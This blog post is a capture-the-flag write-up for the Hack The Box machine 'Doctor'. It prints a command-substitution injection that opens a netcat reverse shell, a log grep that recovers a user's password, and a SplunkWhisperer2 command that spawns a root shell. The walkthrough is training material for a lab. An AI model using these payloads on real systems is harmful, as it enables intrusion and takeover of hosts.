---
layout: post
title:  "Hack The Box - Doctor Writeup"
date:   2021-02-06 06:00:00
image: 
  path: /assets/img/htb/HTB-Doctor/Header.png
author: Ryan
---

- Table of Contents
{:toc .large-only}

*[Hack The Box](https://hackthebox.eu) is an online platform allowing you to test your penetration testing skills and exchange ideas and methodologies with thousands of people in the security field.*  

Doctor is an Easy level linux machine. Based on the creator and community statistics, this box is fairly balanced over the type of approach we'll need to take, leaning slightly more towards the "CVE" and "Real" categories.  
![Statistics](/assets/img/htb/HTB-Doctor/Statistics.png)

## Information Gathering

#### Nmap
By scanning the target IP with Nmap, we're able to find what ports are open (`-p`), while fingerprinting the services running and their versions (`-sV`). We're also running the default set of scripts (`-sC`), which can help find additional information and automate some of our initial steps. Once the scan is completed, nmap will write the results to our Extracts folder (`-oA`)  
`>> nmap -p22,80,8089 -sV -sC -oA Extracts/Doctor 10.10.10.209`  
![Nmap](/assets/img/htb/HTB-Doctor/nmap.png)

* **Port 22 - SSH**: Pretty standard port to see open on linux boxes, we can try to leverage this later on if we find credentials or private key.
* **Port 80 - HTTP**: A basic websever hosting what appears to be a customer-facing website advertising a doctor and his services.
* **Port 8089 - Splunkd**: [Splunk](https://www.splunk.com/), is a software platform used to search, analyze, and visualize data. Commonly used for event logs.

### Customer Website
Navigating to [10.10.10.209](10.10.10.209) allows us to take a look around the website and try to find any clues that may lead to some sort of login or feature we can leverage. One of the first peices of information we find is the email address for `info@doctors.htb`. Let's get that added to our hosts file and check it out.  
![New Host](/assets/img/htb/HTB-Doctor/Recon_Email.png)

### Doctors Secure Messaging
Navigating to the [doctors.htb](doctors.htb) site, we're shown a login screen for what appears to be some sort of internal messaging system. While we're not able to log in with any credentials, we do have the ability to create a new account lasting for 20 minutes.  
![Account Creation](/assets/img/htb/HTB-Doctor/Recon_Account.png)

One of the main features in this area of the site is the ability to post messages. After testing various types of content in the message body, we're shown the following error message:  
![URL Validation](/assets/img/htb/HTB-Doctor/Recon_URL.png)

Without observing any client-side javascript conducting this URL validation, it appears to be coming from the server. Let's try to manipulate it.

## Foothold
While [https://www.google.com](https://www.google.com) looks completely legitimate to us, HackTheBox might be blocking it because it's an external resource. Let's try using our own IP in the URL. we can set up out listener with:  
`>> nc -lvnp 1234`

Request:  
![Local URL](/assets/img/htb/HTB-Doctor/Foothold_1_URL.png)

Response:  
![Local URL](/assets/img/htb/HTB-Doctor/Foothold_1_URL2.png)

Interstingly, we recieve the same invalid error message as before, but by checking our listener, we see the target box made a call to our machine using `curl`.

### Testing for Injection
As the box's "Doctor" name and logo suggests, we should test out the possibility for injection. If the application is passing our URL directly into curl, it could be possible to use [Command Substitution](https://tldp.org/LDP/abs/html/commandsub.html) to run additional commands. Let's try adding the output of a simple `whoami` to the end of our URL to verify:  

Request:  
![Local URL](/assets/img/htb/HTB-Doctor/Foothold_1_Injection.png)

Response:  
![Local URL](/assets/img/htb/HTB-Doctor/Foothold_1_Injection2.png)

We're succesfully able to inject additional commands into the url verification. Looks like we're running as the `web` user.

### Weaponizing Our Payload
While we have the ability to run commands through the application, we're able to step up our access by starting a reverse shell. After checking for the tools available to us, we're able to accomplish this through [nc.traditional](https://www.commandlinux.com/man-page/man1/nc.traditional.1.html) and the [Internal Field Separator](https://en.wikipedia.org/wiki/Input_Field_Separators) `$IFS`. 

Listener:  
`>> nc -lvnp 8888`  

Payload:  
`http://10.10.14.2:1234/$(nc.traditional$IFS'10.10.14.2'$IFS'8888'$IFS-e$IFS'/bin/sh')`  

![Reverse Shell](/assets/img/htb/HTB-Doctor/Foothold_1_ReverseShell.png)

## Lateral Movement
Our first step now that we've got a direct connection into the machine is to upgrade the shell.  
![Upgrade Shell](/assets/img/htb/HTB-Doctor/Lateral_UpgradeShell.png)

Looking inside our `web` user's home directory, we see only a couple files related to the blog, but no flag. It appears we'll need to pivot into the user `shaun` to access the first flag.

### Enumeration
As we step through the blog files, we come across the database, `site.db`. Dumping the contents reveals that we'll want to find another way to get access, as the password is protected by a very strong hashing algorithm, bCrypt.  
![Site Databse](/assets/img/htb/HTB-Doctor/Lateral_Database.png)

While we may be unable to retrieve the user's password from the database, it could be worth looking through the application logs to see if we can find anything from before the credentials are hashed. Being a member of the `adm` group, this should be possible.  
`>> groups`  
![User Group](/assets/img/htb/HTB-Doctor/Lateral_Groups.png)  
`>> grep -i password $(find /var/log/apache2 -type f)`  
![Apache Logs](/assets/img/htb/HTB-Doctor/Lateral_Logs.png)

It's pretty common for user's to accidentally type their password into the wrong field. Since we can see this doesn't fit an email pattern, we can try passing `Guitar123` around and see if it gets us anywhere.  
![Shuan User](/assets/img/htb/HTB-Doctor/Lateral_Shaun.png)  

`shaun:Guitar123`

### User Flag
![User Flag](/assets/img/htb/HTB-Doctor/User_Flag.png)  

## Privilege Escalation
Early on, we discovered the existence of a Splunk service running on port 8089. Researching that service led to an interesting Github repository for a tool called [SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2). Their primary focus is on "Local privilege escalation, or remote code execution, through Splunk Universal Forwarder (UF) misconfigurations". Let's try getting another reverse shell going through Splunk using shaun's credentials.  

Listener:  
`>> nc -lvnp 9999`

Payload:  
`>> python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --username shaun --password Guitar123 --lhost 10.10.14.2 --lport 8888 --payload 'nc.traditional 10.10.14.28 9999 -e /bin/sh'`

![PrivEsc Splunk](/assets/img/htb/HTB-Doctor/PrivEsc_Splunk.png)  
![PrivEsc Root](/assets/img/htb/HTB-Doctor/PrivEsc_Root.png)  

### Root Flag
![Root Flag](/assets/img/htb/HTB-Doctor/Root_Flag.png) 